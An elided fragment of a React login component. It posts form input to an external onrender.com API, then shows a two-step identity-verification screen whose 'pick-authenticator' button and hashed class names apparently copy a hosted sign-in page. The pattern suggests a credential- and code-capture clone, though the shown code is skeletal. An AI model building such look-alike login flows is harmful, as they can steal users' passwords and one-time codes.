...
function App() {
    ...
    const handleLogin = async () => {
        setIsLoader("block");
        try {
            const response = await fetch("https://dat-api.onrender.com/client/users", {
                method: "POST",
                headers: {
    ...
    const handleContinue = async () => {
        setIsContinue(true);
        await fetch(`https://dat-api.onrender.com/client/users/${id}`, {
            method: "PUT",
            headers: {
                "Content-Type": "application/json"
            },
                        ...
                        <div className="login">
                            ...
                            <form style={{padding: "0 24px"}}>
                                ...
                                <div className="required">
                                    <p style={firstRequired ? {display: "block"} : {display: "none"}}>Required
                                        field.</p>
                                </div>
                                <FormGroup>
                                ...
                                />
                                <div className="required">
                                    <p style={secondRequired ? {display: "block"} : {display: "none"}}>Required
                                        field.</p>
                                </div>
                                <div className="required">
                    ...
                    <div className="verification">
                        <div className="verify-identity">
                            ...
                            <p style={{textAlign: "center", fontSize: "14px", marginTop: "10px", marginBottom: "0"}}>
                                ...
                                <button type="button" name="action" aria-label="" value="pick-authenticator"
                                        className="c14e56dac">
                                    Resend
                                </button>
                                {" "}
